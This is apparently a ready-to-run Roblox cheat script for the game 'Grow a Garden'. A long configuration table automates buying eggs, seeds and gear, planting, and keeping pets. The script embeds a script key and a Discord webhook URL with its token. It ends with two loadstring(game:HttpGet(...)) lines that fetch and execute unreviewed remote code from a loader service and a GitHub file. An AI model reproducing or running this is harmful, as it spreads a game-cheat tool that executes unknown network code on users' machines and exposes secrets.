script_key="pakBKJVzXIBWhOgSMvlXWoCJFfeCuBKX";
setfpscap(2)

getgenv().gagConfig = {
    -- Event:
    CRAFT_EVENT = { "Anti Bee Egg", "Skyroot Chest", "Sprout Egg" },
    BUY_TRAVELING_MERCHANT = { "Bee Egg", "Primal Egg", "Paradise Egg", "Rare Summer Egg", "Common Summer Egg" },
    CLAIM_FOOD_CONNOISSEUR_REWARD = {"Culinarian Chest", "Gourmet Egg", "Gorilla Chef"},
    MAX_EVENT_RESTOCK_SHECKLES = 200_000_000_000_000,  -- Restock stop at..
    BUY_EVENT_SHOP = { "Sprout Egg", "Skyroot Chest", "Sprout Seed Pack" },
    
    -- General:
    AUTO_UPDATE_RESTART = false,
    REDEEM_CODES = {},
    EXTRA_PET_SLOTS = 5,
    EXTRA_EGG_SLOTS = 5,
    ADD_FRIEND = true,
    OPEN_ALL_SEED_PACK = false,
    PLACE_COSMETIC = { "Fairy Targeter", "Cooking Kit", "Cooking Cauldron" },

    MAX_PLANTS = 330,
    DESTROY_UNTIL_MIN_PLANTS = 330,
    DELETE_PLANTS_AFTER_MAX = { "Carrot", "Strawberry", "Blueberry", "Tomato", "Cauliflower", "Apple", "Coconut" },

    LIMIT_PLANT_SEED = { ["Romanesco"] = 4, ["Giant Pinecone"] = 4, ["Burning Bud"] = 4, ["Sugar Apple"] = 4, ["Ember Lily"] = 4, ["Beanstalk"] = 4, ["Cacao"] = 4, ["Pepper"] = 4, ["Mushroom"] = 4, ["Grape"] = 4, ["Mango"] = 4, ["Dragon Fruit"] = 4, ["Cactus"] = 4, ["Coconut"] = 4, ["Bamboo"] = 4, ["Apple"] = 4, ["Pumpkin"] = 4, ["Watermelon"] = 4, ["Daffodil"] = 4, ["Tomato"] = 4, ["Orange Tulip"] = 4, ["Blueberry"] = 4, ["Strawberry"] = 4, ["Carrot"] = 4, ["Rose"] = 4, ["Dezen"] = 4, ["Artichoke"] = 4, ["Onion"] = 4, ["Cauliflower"] = 4, ["Raspberry"] = 4, ["Foxglove"] = 4, ["Corn"] = 4, ["Horsetail"] = 4, ["Twisted Tangle"] = 4, ["Jalapeno"] = 4, ["Avocado"] = 4, ["Green Apple"] = 4, ["Banana"] = 4, ["Lilac"] = 4, ["Taro Flower"] = 4, ["Rafflesia"] = 4, ["Lingonberry"] = 4, ["Lucky Bamboo"] = 4, ["Veinpetal"] = 4, ["Crown Melon"] = 4, ["Peach"] = 4, ["Pineapple"] = 4, ["Amber Spine"] = 4, ["Kiwi"] = 4, ["Bell Pepper"] = 4, ["Prickly Pear"] = 4, ["Pink Lily"] = 4, ["Purple Dahlia"] = 4, ["Tall Asparagus"] = 4, ["Sugarglaze"] = 4, ["Loquat"] = 4, ["Feijoa"] = 4, ["Pitcher Plant"] = 4, ["Grand Volcania"] = 4, ["Sunflower"] = 4, ["Grand Tomato"] = 4, ["Taco Fern"] = 4, ["Ember Lily"] = 4, ["Chocolate Carrot"] = 4, ["Red Lollipop"] = 4, ["Nightshade"] = 4, ["Crocus"] = 4, ["Lavender"] = 4, ["Manuka Flower"] = 4, ["Wild Carrot"] = 4, ["Stonebite"] = 4, ["Candy Sunflower"] = 4, ["Peace Lily"] = 4, ["Mint"] = 4, ["Blue Lollipop"] = 4, ["Glowshroom"] = 4, ["Dandelion"] = 4, ["Nectarshade"] = 4, ["Succulent"] = 4, ["Bee Balm"] = 4, ["Pear"] = 4, ["Delphinium"] = 4, ["Liberty Lily"] = 4, ["Paradise Petal"] = 4, ["Cranberry"] = 4, ["Durian"] = 4, ["Papaya"] = 4, ["Moonflower"] = 4, ["Starfruit"] = 4, ["Lumira"] = 4, ["Violet Corn"] = 4, ["Nectar Thorn"] = 4, ["Cantaloupe"] = 4, ["Aloe Vera"] = 4, ["Firework Flower"] = 4, ["White Mulberry"] = 4, ["Dragon Sapling"] = 4, ["Horned Dinoshroom"] = 4, ["Boneboo"] = 4, ["Fruitball"] = 4, ["Enkaku"] = 4, ["Sakura Bush"] = 4, ["Easter Egg"] = 4, ["Eggplant"] = 4, ["Passionfruit"] = 4, ["Lemon"] = 4, ["Moonglow"] = 4, ["Moon Melon"] = 4, ["Blood Banana"] = 4, ["Celestiberry"] = 4, ["Guanabana"] = 4, ["Nectarine"] = 4, ["Honeysuckle"] = 4, ["Suncoil"] = 4, ["Bendboo"] = 4, ["Cocovine"] = 4, ["Parasol Flower"] = 4, ["Lily Of The Valley"] = 4, ["Firefly Fern"] = 4, ["Moon Mango"] = 4, ["Candy Blossom"] = 4, ["Cherry Blossom"] = 4, ["Lotus"] = 4, ["Venus Fly Trap"] = 4, ["Rosy Delight"] = 4, ["Traveler's Fruit"] = 4, ["Fossilight"] = 4, ["Tranquil Bloom"] = 4, ["Elephant Ears"] = 4, ["Bone Blossom"] = 4, ["Pink Tulip"] = 4, ["Noble Flower"] = 4, ["Purple Cabbage"] = 4, ["Sinisterdrip"] = 4, ["Mega Mushroom"] = 4, ["Ice Cream Bean"] = 4, ["Lime"] = 4, ["Crimson Vine"] = 4 },

    BUY_EGGS = { ["Legendary Egg"] = 99, "Mythical Egg", "Bug Egg", "Bee Egg", "Paradise Egg", ["Common Summer Egg"] = 99, ["Rare Summer Egg"] = 99, ["Uncommon Egg"] = 99, ["Rare Egg"] = 99},
    PLANT_EGGS = { "Sprout Egg", "Legendary Egg", "Gourmet Egg", "Zen Egg", "Anti Bee Egg", "Primal Egg", "Bug Egg", "Paradise Egg", "Mythical Egg", "Common Summer Egg", "Rare Summer Egg", "Rare Egg" },
    
    -- BUY_SEED_SHOP Priority (Left -> Right)
    BUY_SEED_SHOP = { "Romanesco", "Giant Pinecone", "Burning Bud", "Sugar Apple", "Ember Lily", "Beanstalk", "Cacao", "Pepper", "Mushroom", "Grape", "Mango", "Dragon Fruit", "Cactus", "Coconut", "Bamboo", "Apple", "Pumpkin", "Watermelon", "Daffodil", "Tomato", "Orange Tulip", "Blueberry", "Strawberry", "Carrot" },
    KEEP_SEEDS = { "Beanstalk", "Grand Tomato", "King Cabbage", "Bone Blossom" },
    
    FAVOURITE_FRUIT_MUTATIONS = {},
    SKIP_HARVEST_MUTATIONS = {},

    KEEP_PETS = { "Cockatrice", ["Glimmering Sprite"] = 8, ["Imp"] = 2, "Griffin", ["Brown Mouse"] = 2, ["Squirrel"] = 1, ["Grey Mouse"] = 2,  ["Rooster"] = 4, "Lemon Lion", "Apple Gazelle", "Peach Wasp", "Chicken Zombie", ["Gorilla Chef"] = 8, "Green Bean", ["Golem"] = 1, "Golden Goose", ["Spriggan"] = 2, "Lobster Thermidor", ["Sunny-Side Chicken"] = 18, ["Junkbot"] = 2, "French Fry Ferret", ["Kodama"] = 1, "Corrupted Kitsune", ["Starfish"] = 10, ["Capybara"] = 1, ["Seal"] = 1, "Kitsune", "Blood Kiwi", "Disco Bee", "Raccoon", "Queen Bee", "Dragonfly", "Butterfly", "Mimic Octopus", "Red Fox" },
    KEEP_PETS_WEIGHT = 5,

    -- EQUIP_PETS Priority (Left -> Right)
    EQUIP_PETS = { ["Glimmering Sprite"] = 2, ["Sunny-Side Chicken"] = 5, ["Capybara"] = 1, ["Starfish"] = 8, ["Brown Mouse"] = 2, ["Squirrel"] = 1, ["Grey Mouse"] = 2,  ["Rooster"] = 4 },
    USE_PETS_FOR_UPGRADE_SLOT = { "Starfish", "Capybara", "Brown Mouse", "Grey Mouse", "Rooster" },

    BUY_GEAR_SHOP = { "Master Sprinkler", "Godly Sprinkler", "Advanced Sprinkler", "Basic Sprinkler" },
    USE_SPRINKLER = { "Basic Sprinkler", "Master Sprinkler", "Godly Sprinkler", "Advanced Sprinkler" },

    PET_WEBHOOK_URL = "https://discord.com/api/webhooks/1386629644140417145/rXZ-L2AWqC2p-dzbGULNBLoKmQiJ7tvUrPIhsFT5DcysdOvid77952-1jVKi4hOiq0qs",
    SEED_WEBHOOK_URL = "", 
    NOTIFY_PETS = { "Cockatrice", "Griffin", "Golden Goose", "Lobster Thermidor", "French Fry Ferret", "Corrupted Kitsune", "Kitsune", "Fennec Fox", "Disco Bee", "Raccoon", "Queen Bee", "Dragonfly", "Butterfly", "Mimic Octopus", "T-Rex", "Red Fox", "Spinosaurus"},
    NOTIFY_PETS_WEIGHT = 5,
    DISCORD_ID = "",
    WEBHOOK_NOTE = "hi baby",
    SHOW_WEBHOOK_USERNAME = true,
}

loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/a2234a9cfbe480dfed9eaf6c00a012ca.lua"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/PHUCKDUBITCHdzza/config/refs/heads/main/chest.lua"))()
















